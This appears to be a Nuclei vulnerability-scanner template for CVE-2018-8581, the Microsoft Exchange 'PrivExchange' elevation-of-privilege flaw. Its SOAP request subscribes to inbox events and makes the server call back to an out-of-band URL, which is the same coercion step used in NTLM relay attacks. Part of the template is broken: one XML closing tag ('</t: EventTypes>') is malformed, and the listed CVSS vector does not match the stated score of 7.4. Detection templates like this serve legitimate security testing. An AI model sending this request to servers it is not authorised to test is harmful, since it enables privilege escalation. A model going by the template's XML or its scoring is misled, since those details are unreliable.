http/cves/2018/CVE-2018-8581.yaml

id: CVE-2018-8581

info:
  name: Microsoft Exchange Server - Elevation of Privilege
  author: Psiquis-X
  severity: high
  description: |
    Microsoft Exchange Server allows for elevation of privilege as it fails to properly handle
    maliciously crafted applications. This vulnerability can be used for NTLM relay attacks.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2018-8581
    - https://github.com/dirkjanm/PrivExchange
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.4
    cve-id: CVE-2018-8581
  tags: cve,cve2018,exchange,microsoft,ews,privilege-escalation

http:
  - method: POST
    path:
      - "{{BaseURL}}/EWS/Exchange.asmx"

    headers:
      Content-Type: "text/xml; charset=utf-8"
      Soapaction: ' "http://schemas.microsoft.com/exchange/services/2006/messages/Subscribe" '

    body: |
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Header>
          <t:RequestServerVersion Version="Exchange2010" />
        </soap:Header>
        <soap:Body>
          <m:Subscribe>
            <m:PushSubscriptionRequest>
              <t:FolderIds>
                <t:DistinguishedFolderId Id="inbox" />
              </t:FolderIds>
              <t:EventTypes>
                <t:EventType>NewMailEvent</t:EventType>
              </t: EventTypes>
              <t:StatusFrequency>1</t:StatusFrequency>
              <t:URL>http://{{interactsh-url}}</t:URL>
            </m:PushSubscriptionRequest>
          </m:Subscribe>
        </soap:Body>
      </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: status
        status:
          - 200
